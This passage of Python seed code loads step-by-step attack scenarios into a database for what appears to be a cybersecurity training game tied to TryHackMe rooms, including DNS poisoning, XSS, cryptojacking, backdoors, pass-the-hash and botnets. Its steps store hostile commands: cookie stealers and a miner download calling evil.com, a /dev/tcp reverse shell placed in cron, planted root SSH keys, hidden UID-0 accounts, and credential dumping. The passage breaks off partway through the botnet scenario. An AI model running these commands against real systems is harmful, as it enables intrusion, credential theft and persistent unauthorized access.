    ('DNS Poisoning', 'Manipulate DNS cache to redirect users to malicious servers', 'DNS Poisoning', 'Advanced',
     'DNS in Detail|https://tryhackme.com/room/dnsindetail;Nmap|https://tryhackme.com/room/nmap01',
     'Wireshark|https://tryhackme.com/room/wireshark;DNS Analysis|https://tryhackme.com/room/dnsindetail'))
    for s in [(7,1,'DNS Recon','Enumerate DNS infrastructure','dns_recon','dig axfr @ns1.targetbank.com targetbank.com','Use dig zone transfer','Zone transfer: 23 records leaked'),
              (7,2,'Rogue DNS','Set up malicious DNS server','rogue_dns','dnschef --fakeip 10.0.0.99 --fakedomains targetbank.com','Set up dnschef','Rogue DNS: targetbank.com -> 10.0.0.99'),
              (7,3,'Cache Poisoning','Inject forged DNS responses','poison_cache','dnspoisoner --target-resolver 192.168.1.1 --domain targetbank.com --ip 10.0.0.99','Poison DNS cache','Cache poisoned: targetbank.com -> 10.0.0.99'),
              (7,4,'Clone Site','Clone target banking site','clone_site','httrack --mirror https://targetbank.com -O /var/www/fake','Clone website','Site cloned at 10.0.0.99'),
              (7,5,'Harvest Creds','Capture redirected user creds','harvest','harvest --listen 443 --log creds.txt','Start harvester','Login captured: acct 4521-XXXX'),
              (7,6,'Fraudulent Transfer','Execute unauthorized transfer','transfer','curl -b stolen_session https://targetbank.com/api/transfer --data "amount=50000"','Execute transfer','Transfer: $50K | TXN-8847231')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # SCENARIO 8: Supply Chain Attack
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Supply Chain Attack', 'Compromise a software dependency to inject malicious code downstream', 'Supply Chain', 'Advanced',
     'OWASP Top 10|https://tryhackme.com/room/owasptop10;Intro to Malware|https://tryhackme.com/room/malmalintroductory',
     'YARA|https://tryhackme.com/room/yara;Incident Response|https://tryhackme.com/room/introtoir'))
    for s in [(8,1,'Find Package','Identify vulnerable package','find_package','npm search analytics-helper --popularity desc','Search npm','Target: analytics-helper v2.1.3 | 50K downloads'),
              (8,2,'Compromise Maintainer','Gain maintainer access','compromise_account','credential-spray --target npmjs.com --user pkg-maintainer','Spray credentials','Maintainer compromised | No MFA'),
              (8,3,'Inject Backdoor','Add malicious install script','inject_code','npm version patch && echo "require(./backdoor)" >> postinstall.js','Inject backdoor','Backdoor: exfiltrates env vars + SSH keys'),
              (8,4,'Publish Malicious','Push to registry','publish','npm publish --tag latest','Publish package','v2.1.4 published | 3,200 installs in 24h'),
              (8,5,'Collect Data','Harvest stolen credentials','collect_data','nc -lvp 8443 >> stolen.txt','Listen for data','847 SSH keys, 1,204 API tokens received'),
              (8,6,'Pivot to Enterprise','Access high-value target','pivot','ssh -i stolen_key.pem admin@enterprise-target.com','SSH with stolen key','Access: enterprise-target.com | AWS root creds')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 9: XSS (Cross-Site Scripting)
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Cross-Site Scripting (XSS)', 'Inject malicious scripts into a trusted website to steal user data and session tokens',
     'XSS', 'Beginner',
     'XSS|https://tryhackme.com/room/xss;OWASP Top 10|https://tryhackme.com/room/owasptop10',
     'Web App Forensics|https://tryhackme.com/room/dvwa;Log Analysis|https://tryhackme.com/room/introtologs'))
    for s in [(9,1,'Find Input Fields','Identify user input points on the target web app','find_inputs','dirb http://target-app.com /usr/share/wordlists/common.txt','Use dirb to find pages with input fields','Discovered: /search, /comments, /profile, /contact | 4 input fields found'),
              (9,2,'Test for Reflected XSS','Inject test script into search parameter','test_xss','curl http://target-app.com/search?q=<script>alert(1)</script>','Try injecting a script tag in the search','Parameter q reflects input without sanitization | XSS confirmed'),
              (9,3,'Craft Cookie Stealer','Create payload to exfiltrate session cookies','craft_payload','python3 -c "print(\'<script>new Image().src=\"http://evil.com/steal?c=\"+document.cookie</script>\')"','Create a cookie-stealing XSS payload','Payload crafted: cookie exfiltration via image request to evil.com'),
              (9,4,'Deploy Payload','Inject stored XSS into comment section','deploy_xss','curl -X POST http://target-app.com/comments -d "body=<script>fetch(\'http://evil.com/\'+document.cookie)</script>"','Post the XSS payload as a comment','Stored XSS injected in comments | Awaiting victim visits'),
              (9,5,'Capture Sessions','Collect stolen session tokens from victims','capture','nc -lvp 80 | grep cookie','Listen for stolen cookies','Captured 12 session tokens | Admin session: PHPSESSID=a8f3b2c1'),
              (9,6,'Account Takeover','Use stolen admin session to access admin panel','takeover','curl -b "PHPSESSID=a8f3b2c1" http://target-app.com/admin','Use the stolen cookie to access admin','Admin panel accessed | User data exposed | 2,500 accounts visible')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 10: Rogue Access Point
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Rogue Access Point', 'Set up a fake WiFi access point to intercept wireless traffic from unsuspecting users',
     'WiFi Attack', 'Beginner',
     'Wifi Hacking 101|https://tryhackme.com/room/wifihacking101;Network Services|https://tryhackme.com/room/networkservices',
     'Wireshark|https://tryhackme.com/room/wireshark;Network Forensics|https://tryhackme.com/room/introtologs'))
    for s in [(10,1,'Survey Wireless Networks','Scan for existing WiFi networks in the area','survey','airodump-ng wlan0mon','Use airodump-ng to scan for networks','Found: CoffeeShop-WiFi (ch6, WPA2), Guest-Net (open), Corp-WiFi (WPA2-Enterprise)'),
              (10,2,'Create Rogue AP','Set up fake access point mimicking legitimate network','create_ap','hostapd-mana rogue_ap.conf --ssid CoffeeShop-WiFi','Use hostapd-mana to create rogue AP','Rogue AP active: CoffeeShop-WiFi | Channel 6 | Stronger signal than original'),
              (10,3,'Configure DHCP','Assign IP addresses to connecting clients','dhcp','dnsmasq --dhcp-range=10.0.0.10,10.0.0.50 --interface=wlan0','Configure DHCP with dnsmasq','DHCP server running | Range: 10.0.0.10-50 | Gateway: 10.0.0.1'),
              (10,4,'Enable Traffic Routing','Route victim traffic through attacker machine','route','iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080','Set up iptables for traffic redirect','Traffic routing enabled | HTTP redirected to proxy on port 8080'),
              (10,5,'Capture Credentials','Intercept login credentials from connected users','capture','tcpdump -i wlan0 -w rogue_capture.pcap port 80 or port 443','Use tcpdump to capture traffic','5 clients connected | Captured HTTP POST to login.bank.com | Credentials visible'),
              (10,6,'Extract Data','Analyze captured packets for sensitive information','extract','tshark -r rogue_capture.pcap -Y http.request.method==POST -T fields -e http.file_data','Extract POST data with tshark','Extracted 3 login credentials, 2 API keys, 1 session token from captured traffic')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 11: Rainbow Table Attack
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Rainbow Table Attack', 'Use precomputed hash tables to crack password hashes stolen from a database breach',
     'Password Attack', 'Beginner',
     'Crack the Hash|https://tryhackme.com/room/crackthehash;John the Ripper|https://tryhackme.com/room/johntheripper0',
     'Intro to Digital Forensics|https://tryhackme.com/room/introdigitalforensics;Log Analysis|https://tryhackme.com/room/introtologs'))
    for s in [(11,1,'Obtain Hash Dump','Acquire password hashes from compromised database','get_hashes','mysqldump -u root -p --single-transaction target_db users > hash_dump.sql','Dump the users table with mysqldump','Extracted 5,200 password hashes | Algorithm: MD5 (unsalted)'),
              (11,2,'Identify Hash Type','Determine the hashing algorithm used','identify','hashid -m hash_dump.txt','Use hashid to identify hash type','Hash type: MD5 (mode 0) | No salt detected | Vulnerable to rainbow table'),
              (11,3,'Download Rainbow Tables','Get precomputed rainbow tables for MD5','download','wget http://rainbow-tables.com/md5_complete.rt','Download MD5 rainbow tables','Rainbow table downloaded: 24GB | Covers 8-char alphanumeric passwords'),
              (11,4,'Run Rainbow Crack','Look up hashes against the rainbow table','crack','rcrack /tables/md5/ -h hash_dump.txt','Run rcrack against the hash dump','Cracked 3,847/5,200 hashes (74%) | Average time: 0.3s per hash'),
              (11,5,'Crack Remaining Hashes','Use hashcat for remaining resistant hashes','remaining','hashcat -m 0 -a 0 remaining_hashes.txt rockyou.txt','Use hashcat with rockyou wordlist','Additional 892 hashes cracked | Total: 4,739/5,200 (91%)'),
              (11,6,'Credential Validation','Test cracked credentials against live services','validate','hydra -L users.txt -P cracked_passes.txt target.com ssh','Use hydra to test credentials','Valid logins found: 847 accounts | 12 admin accounts compromised')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 12: Social Engineering
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Social Engineering Attacks', 'Manipulate people through pretexting and vishing to gain unauthorized access to systems',
     'Social Engineering', 'Beginner',
     'Intro to Social Engineering|https://tryhackme.com/room/introtosocialengineering;Phishing|https://tryhackme.com/room/phishingyl',
     'Email Analysis|https://tryhackme.com/room/youremailedphishing;Incident Response|https://tryhackme.com/room/introtoir'))
    for s in [(12,1,'OSINT Reconnaissance','Gather target employee information from social media','osint','maltego --target "AcmeCorp" --transform social_media','Use Maltego for social media OSINT','Found: 45 employees on LinkedIn | CEO: John Smith | IT Admin: Sarah Lee'),
              (12,2,'Craft Pretext','Create convincing cover story for social engineering','pretext','gophish --campaign new --template it_support_verification','Set up GoPhish campaign with pretext','Pretext ready: IT support calling about security audit | Caller ID spoofed'),
              (12,3,'Vishing Call','Call target pretending to be IT support','vish','spoofcard --caller-id +1-555-ACME --target sarah.lee','Spoof caller ID to match company number','Called Sarah Lee as IT Support | She confirmed her employee ID and VPN password'),
              (12,4,'Credential Harvesting','Use obtained info to access systems','harvest','ssh sarah.lee@acme-vpn.com','SSH with social engineered credentials','VPN access granted | Internal network visible | LDAP directory accessible'),
              (12,5,'Privilege Escalation','Exploit trust to get admin credentials','escalate','ldapsearch -x -H ldap://dc01.acme.local -b "dc=acme,dc=local" "(adminCount=1)"','Query LDAP for admin accounts','Found 3 domain admin accounts | Password policy: 90-day rotation'),
              (12,6,'Data Access','Access confidential files using elevated privileges','access','smbclient //fileserver.acme.local/confidential -U admin','Access confidential file share','Accessed: /confidential/financials/ | 2,300 files | Trade secrets exposed')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 13: Cryptojacking
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Cryptojacking', 'Hijack computing resources to mine cryptocurrency without the owner knowing',
     'Cryptojacking', 'Beginner',
     'MAL: Malware Introductory|https://tryhackme.com/room/malmalintroductory;Metasploit Introduction|https://tryhackme.com/room/metasploitintro',
     'Volatility|https://tryhackme.com/room/volatility;YARA|https://tryhackme.com/room/yara'))
    for s in [(13,1,'Find Vulnerable Servers','Scan for exposed web servers with known CVEs','scan','nmap -sV --script vuln 10.0.0.0/24','Use nmap vuln scripts to find targets','Found 3 servers with Apache Struts CVE-2017-5638 | Port 8080 open'),
              (13,2,'Exploit Entry Point','Gain access through vulnerable service','exploit','msfconsole -x "use exploit/multi/http/struts2_content_type_ognl; set RHOSTS 10.0.0.15; run"','Use Metasploit Struts exploit','Shell obtained on 10.0.0.15 | User: www-data | OS: Ubuntu 20.04'),
              (13,3,'Deploy Miner','Install cryptocurrency mining software','deploy','wget -q http://evil.com/xmrig -O /tmp/.cache && chmod +x /tmp/.cache && /tmp/.cache -o pool.evil.com','Download and run XMRig miner','XMRig deployed | Mining Monero | Pool: pool.evil.com | CPU usage: 95%'),
              (13,4,'Setup Persistence','Ensure miner survives reboots','persist','echo "@reboot /tmp/.cache -o pool.evil.com" | crontab -','Add miner to crontab','Crontab persistence installed | Miner restarts on reboot | Process disguised as [kworker]'),
              (13,5,'Spread to Network','Propagate miner to other machines on network','spread','psexec.py admin:P@ssw0rd@10.0.0.16 cmd /c "powershell -ep bypass -c IEX(curl http://evil.com/miner.ps1)"','Use psexec to spread to other machines','Miner deployed on 10.0.0.16, 10.0.0.17 | Total CPU hijacked: 12 cores'),
              (13,6,'Collect Revenue','Monitor mining pool for earned cryptocurrency','collect','curl https://pool.evil.com/api/stats?wallet=44AFFq5 | python3 -m json.tool','Check mining pool stats','Mining stats: 1.2 KH/s | Earned: 0.47 XMR ($78) | Targets unaware for 45 days')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 14: Backdoor Installation
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Backdoor Installation', 'Plant a persistent backdoor on a compromised system for ongoing remote access',
     'Backdoor', 'Intermediate',
     'Metasploit Introduction|https://tryhackme.com/room/metasploitintro;Linux PrivEsc|https://tryhackme.com/room/linprivesc',
     'Volatility|https://tryhackme.com/room/volatility;Incident Response|https://tryhackme.com/room/introtoir'))
    for s in [(14,1,'Initial Access','Exploit vulnerable service to gain shell','access','msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.0.0.20; run"','Use Metasploit vsftpd exploit','Shell on 10.0.0.20 | User: daemon | vsftpd 2.3.4 exploited'),
              (14,2,'Privilege Escalation','Escalate to root via kernel exploit','privesc','searchsploit linux kernel 5.4 privilege escalation','Search for kernel exploits','CVE-2021-4034 (PwnKit) found | Compiling exploit...'),
              (14,3,'Install Backdoor','Deploy persistent reverse shell','install','echo "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1" > /etc/cron.daily/update','Add reverse shell to cron','Backdoor installed in /etc/cron.daily/update | Runs daily'),
              (14,4,'Create SSH Key','Plant SSH key for passwordless access','ssh_key','echo "ssh-rsa AAAA...attacker_key" >> /root/.ssh/authorized_keys','Add SSH key to root authorized_keys','SSH key planted | Attacker can SSH as root without password'),
              (14,5,'Hide Backdoor','Conceal backdoor from detection','hide','touch -r /etc/cron.daily/logrotate /etc/cron.daily/update && chattr +i /etc/cron.daily/update','Match timestamps and make file immutable','Timestamps matched to logrotate | File set immutable | Hidden from ls -la'),
              (14,6,'Test Persistence','Verify backdoor survives reboot','test','ssh -i attacker_key root@10.0.0.20 "id && hostname && cat /etc/shadow | head -3"','SSH with planted key to verify access','Root access confirmed after reboot | Shadow file readable | Backdoor persistent')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 15: Privilege Escalation
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Privilege Escalation', 'Escalate from low-privilege user to root/admin through misconfigurations and exploits',
     'PrivEsc', 'Intermediate',
     'Linux PrivEsc|https://tryhackme.com/room/linprivesc;Windows PrivEsc|https://tryhackme.com/room/windowsprivesc20',
     'Incident Response|https://tryhackme.com/room/introtoir;Volatility|https://tryhackme.com/room/volatility'))
    for s in [(15,1,'Enumerate System','Gather system info and find weaknesses','enum','linpeas.sh | tee /tmp/linpeas_output.txt','Run LinPEAS for automated enumeration','OS: Ubuntu 20.04 | Kernel: 5.4.0 | SUID binaries: 12 found | Writable /etc/passwd'),
              (15,2,'Check SUID Binaries','Find exploitable SUID programs','suid','find / -perm -4000 -type f 2>/dev/null','Find all SUID binaries','SUID: /usr/bin/find, /usr/bin/python3, /usr/bin/pkexec | python3 is exploitable!'),
              (15,3,'Exploit SUID Python','Use SUID python3 to spawn root shell','exploit_suid','python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"','Exploit SUID python3 for root','Root shell obtained via SUID python3! | uid=0(root) gid=0(root)'),
              (15,4,'Dump Credentials','Extract password hashes from shadow file','dump','unshadow /etc/passwd /etc/shadow > hashes.txt','Combine passwd and shadow files','8 user hashes extracted | Root hash: $6$rounds=5000$...'),
              (15,5,'Crack Root Hash','Crack the root password hash','crack','john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt','Use John the Ripper to crack hashes','Root password cracked: Summer2024! | 3 other accounts cracked'),
              (15,6,'Establish Persistence','Create hidden admin account','persist','useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysbackup','Create hidden root-level user','Hidden user sysbackup created with UID 0 | Persistent root access established')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 16: Session Hijacking
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Session Hijacking', 'Steal active web session tokens to impersonate authenticated users',
     'Session Hijacking', 'Intermediate',
     'OWASP Top 10|https://tryhackme.com/room/owasptop10;Burp Suite Basics|https://tryhackme.com/room/burpsuitebasics',
     'Web App Forensics|https://tryhackme.com/room/dvwa;Log Analysis|https://tryhackme.com/room/introtologs'))
    for s in [(16,1,'Intercept Traffic','Capture network traffic on shared network','intercept','wireshark -i eth0 -f "tcp port 80" -w session_capture.pcap','Capture HTTP traffic with Wireshark','Capturing packets on eth0 | Filter: TCP port 80 | 2,341 packets captured'),
              (16,2,'Extract Session Cookies','Find session tokens in captured traffic','extract','tshark -r session_capture.pcap -Y "http.cookie" -T fields -e http.cookie','Extract cookies with tshark','Found 15 session cookies | Target: JSESSIONID=ABC123DEF456 (admin user)'),
              (16,3,'Validate Session','Check if stolen session is still active','validate','curl -b "JSESSIONID=ABC123DEF456" http://target-app.com/api/whoami','Test the stolen session cookie','Session valid | User: admin@target-app.com | Role: administrator | Expires: 2h'),
              (16,4,'Impersonate User','Use stolen session to access admin panel','impersonate','curl -b "JSESSIONID=ABC123DEF456" http://target-app.com/admin/dashboard','Access admin dashboard with stolen session','Admin dashboard accessed | 15,000 user accounts visible | System settings exposed'),
              (16,5,'Escalate Access','Modify user permissions via admin panel','escalate','curl -X PUT -b "JSESSIONID=ABC123DEF456" http://target-app.com/admin/users/1 -d "role=superadmin"','Elevate attacker account to superadmin','Attacker account elevated to superadmin | Full system control obtained'),
              (16,6,'Exfiltrate Data','Download sensitive data through admin API','exfiltrate','curl -b "JSESSIONID=ABC123DEF456" http://target-app.com/admin/export/users > stolen_users.csv','Export user database via admin API','Exported 15,000 user records | Includes emails, hashed passwords, PII')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 17: Spyware & Keyloggers
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Spyware & Keyloggers', 'Deploy spyware to secretly monitor user activity and capture keystrokes',
     'Spyware', 'Intermediate',
     'MAL: Malware Introductory|https://tryhackme.com/room/malmalintroductory;History of Malware|https://tryhackme.com/room/historyofmalware',
     'REMnux|https://tryhackme.com/room/yourfirstmalwareanalysis;Volatility|https://tryhackme.com/room/volatility'))
    for s in [(17,1,'Create Keylogger','Build a keylogger payload with screenshot capture','create','msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 -f exe -o screensaver.exe','Generate keylogger payload with msfvenom','Payload: screensaver.exe | 68KB | Includes keylogger + screenshot modules'),
              (17,2,'Social Engineering Delivery','Send payload disguised as software update','deliver','sendmail --to target@company.com --attach screensaver.exe --subject "Required Security Update"','Email the payload as a fake update','Email sent to target@company.com | Subject: Required Security Update | Attachment: screensaver.exe'),
              (17,3,'Activate Keylogger','Start keystroke capture on victim machine','activate','meterpreter> keyscan_start','Start keylogger in meterpreter session','Keylogger activated | Capturing all keystrokes | Buffer recording started'),
              (17,4,'Capture Screenshots','Take periodic screenshots of victim desktop','screenshot','meterpreter> screenshot -p /loot/ -v true -q 75','Take screenshots via meterpreter','15 screenshots captured | Includes: email client, banking site, password manager'),
              (17,5,'Dump Keystrokes','Retrieve captured keystrokes from buffer','dump','meterpreter> keyscan_dump','Dump captured keystrokes','Keystrokes captured: email passwords, bank login, credit card number typed in browser'),
              (17,6,'Exfiltrate Data','Send collected data to attacker server','exfiltrate','meterpreter> download /loot/ /home/attacker/stolen_data/','Download all captured data','Exfiltrated: 847 keystrokes, 15 screenshots, 3 credential pairs, 1 credit card')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 18: Evil Twin Attack
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Evil Twin Attack', 'Clone a legitimate WiFi network to lure users and intercept their traffic',
     'WiFi Attack', 'Intermediate',
     'Wifi Hacking 101|https://tryhackme.com/room/wifihacking101;Wireshark|https://tryhackme.com/room/wireshark',
     'Wireshark|https://tryhackme.com/room/wireshark;Network Forensics|https://tryhackme.com/room/introtologs'))
    for s in [(18,1,'Monitor Mode','Put wireless adapter into monitor mode','monitor','airmon-ng start wlan0','Enable monitor mode with airmon-ng','Monitor mode enabled on wlan0mon | Ready to scan wireless networks'),
              (18,2,'Scan Networks','Identify target WiFi network details','scan','airodump-ng wlan0mon --band abg','Scan all bands with airodump-ng','Target: CorpWiFi | BSSID: AA:BB:CC:DD:EE:FF | Channel: 11 | WPA2 | 25 clients'),
              (18,3,'Deauth Clients','Force clients off legitimate AP','deauth','aireplay-ng --deauth 50 -a AA:BB:CC:DD:EE:FF wlan0mon','Send deauth packets to kick clients','Deauth sent | 25 clients disconnected from CorpWiFi | Clients searching for network'),
              (18,4,'Create Evil Twin','Launch identical fake AP with captive portal','evil_twin','fluxion --target CorpWiFi --attack captive_portal','Use Fluxion to create evil twin','Evil Twin active: CorpWiFi | Captive portal: fake login page | 18 clients connected'),
              (18,5,'Capture WPA Key','Harvest WPA password from captive portal','capture_key','cat /tmp/fluxion/captured_keys.txt','Read captured WPA keys','WPA2 password captured: C0rpW1f!2024 | Submitted by 3 different users'),
              (18,6,'Access Network','Connect to real network with stolen credentials','access','nmcli device wifi connect CorpWiFi password C0rpW1f!2024','Connect to real AP with stolen password','Connected to CorpWiFi | Internal network: 172.16.0.0/16 | Domain controller visible')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 19: Handshake Capture
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('WPA Handshake Capture', 'Capture and crack WPA/WPA2 4-way handshake to obtain WiFi password',
     'WiFi Attack', 'Intermediate',
     'Wifi Hacking 101|https://tryhackme.com/room/wifihacking101;Crack the Hash|https://tryhackme.com/room/crackthehash',
     'Wireshark|https://tryhackme.com/room/wireshark;Network Forensics|https://tryhackme.com/room/introtologs'))
    for s in [(19,1,'Enable Monitor','Set wireless card to monitor mode','monitor','airmon-ng start wlan0','Start monitor mode','wlan0mon active | Chipset: Atheros AR9271 | Monitor mode enabled'),
              (19,2,'Target Network','Identify and lock onto target AP','target','airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w capture wlan0mon','Focus airodump on target AP','Locked on: HomeNet-5G | Channel 6 | 4 clients connected | Waiting for handshake'),
              (19,3,'Force Handshake','Deauth a client to force re-authentication','deauth','aireplay-ng --deauth 5 -a AA:BB:CC:11:22:33 -c FF:EE:DD:CC:BB:AA wlan0mon','Deauth one client to trigger handshake','Deauth sent to client FF:EE:DD | Client reconnecting... WPA handshake captured!'),
              (19,4,'Verify Capture','Confirm valid 4-way handshake was captured','verify','aircrack-ng capture-01.cap','Check capture file with aircrack-ng','Valid WPA2 handshake found | EAPOL frames: 4/4 | Ready for cracking'),
              (19,5,'Crack with Wordlist','Use dictionary attack to crack the handshake','crack','aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap','Crack with rockyou wordlist','KEY FOUND: P@ssw0rd123 | Time: 4m 32s | 28,000 keys tested'),
              (19,6,'Verify Access','Connect to network with cracked password','connect','nmcli device wifi connect HomeNet-5G password P@ssw0rd123','Connect using cracked password','Connected to HomeNet-5G | IP: 192.168.1.105 | Gateway: 192.168.1.1 | Full access')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 20: Pass the Hash
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Pass the Hash', 'Use stolen NTLM password hashes to authenticate without knowing the actual password',
     'Credential Abuse', 'Intermediate',
     'Windows PrivEsc|https://tryhackme.com/room/windowsprivesc20;Active Directory|https://tryhackme.com/room/attacktivedirectory',
     'Windows Forensics|https://tryhackme.com/room/introtoir;Incident Response|https://tryhackme.com/room/introtoir'))
    for s in [(20,1,'Gain Initial Access','Compromise a workstation on the network','access','msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.50; run"','Use EternalBlue to gain access','Meterpreter session on WORKSTATION-01 | User: corp\\jsmith | OS: Windows 10'),
              (20,2,'Dump NTLM Hashes','Extract password hashes from memory','dump','mimikatz "privilege::debug" "sekurlsa::logonpasswords"','Run Mimikatz to dump hashes','NTLM hash: Administrator:500:aad3b435...:::  | Domain: CORP | 5 hashes dumped'),
              (20,3,'Identify Targets','Find machines where admin hash is valid','scan','crackmapexec smb 10.0.0.0/24 -u Administrator -H aad3b435... --shares','Use CrackMapExec to test hash across network','Admin hash valid on: DC01, FILESERVER, SQLSERVER | 3/15 hosts pwnable'),
              (20,4,'Pass the Hash','Authenticate to domain controller using hash','pth','psexec.py -hashes aad3b435...:aad3b435... Administrator@10.0.0.10','Use psexec with NTLM hash','SYSTEM shell on DC01 (10.0.0.10) | Domain Controller compromised'),
              (20,5,'Extract Domain Secrets','Dump entire Active Directory database','secrets','secretsdump.py -hashes aad3b435...:aad3b435... Administrator@10.0.0.10','Dump AD secrets with secretsdump','NTDS.dit dumped | 2,500 domain user hashes | 15 domain admin accounts'),
              (20,6,'Golden Ticket','Create persistent Kerberos golden ticket','golden','ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-21-... -domain corp.local Administrator','Create golden ticket with ticketer.py','Golden ticket created | Unlimited domain admin access | Valid for 10 years')]:
        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)

    # ==========================================
    # SCENARIO 21: Botnets
    # ==========================================
    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
    VALUES (?, ?, ?, ?, ?, ?)''',
    ('Botnet Command & Control', 'Build and operate a botnet infrastructure for coordinated attacks',
     'Botnet', 'Intermediate',
     'Nmap|https://tryhackme.com/room/nmap01;Metasploit Introduction|https://tryhackme.com/room/metasploitintro',
     'Wireshark|https://tryhackme.com/room/wireshark;Snort|https://tryhackme.com/room/snort'))
    for s in [(21,1,'Setup C2 Server','Deploy command and control infrastructure','setup_c2','python3 c2_server.py --port 8443 --ssl --beacon-interval 60','Start C2 server with SSL','C2 active on port 8443 | SSL enabled | Beacon interval: 60s | Dashboard ready'),
              (21,2,'Create Bot Payload','Generate bot agent for distribution','create_bot','msfvenom -p python/meterpreter/reverse_https LHOST=c2.evil.com LPORT=8443 -f raw -o bot.py','Create bot agent with msfvenom','Bot agent: bot.py | Connects to c2.evil.com:8443 | Anti-detection: process injection'),
              (21,3,'Mass Distribution','Spread bot via phishing campaign','distribute','gophish --campaign botnet_spread --targets email_list.csv --attachment bot.py','Launch phishing campaign with GoPhish','Campaign sent to 10,000 targets | Open rate: 23% | Infection rate: 8% | 800 bots'),
              (21,4,'Enumerate Botnet','Survey infected machines and capabilities','enumerate','botnet-cli --list-bots --sort-by bandwidth','List all active bots','800 bots online | Total bandwidth: 45 Gbps | OS: 60% Windows, 30% Linux, 10% IoT'),
              (21,5,'Issue Commands','Send coordinated commands to all bots','command','botnet-cli --command "ddos --target victim.com --duration 1h --method syn_flood"','Issue DDoS command to botnet','DDoS launched | 800 bots flooding victim.com | 45 Gbps sustained | Target offline'),
